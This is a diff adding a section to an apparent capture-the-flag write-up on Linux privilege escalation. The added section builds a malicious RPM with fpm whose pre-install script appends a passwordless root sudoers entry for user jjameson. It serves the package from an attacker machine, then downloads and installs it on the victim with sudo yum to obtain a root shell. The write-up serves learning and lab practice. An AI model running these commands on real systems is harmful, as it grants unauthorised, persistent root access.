@@ -106,5 +106,28 @@ sudo -l
 
 <figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+**Kali**&#x20;
 
+```
+echo 'echo "jjameson ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > hack.sh 
+git clone https://github.com/jordansissel/fpm.git 
+cd fpm/bin/ 
+./fpm -n root -s dir -t rpm -a all --before-install /root/hack.sh . 
+python2 -m SimpleHTTPServer 81
+```
+
+Our fpm file is now created&#x20;
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**&#x20;
+
+```
+cd /tmp/ 
+wget http://10.10.160.125:81/root-1.0-1.noarch.rpm 
+sudo yum localinstall root-1.0-1.noarch.rpm 
+sudo -i
+```
+
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
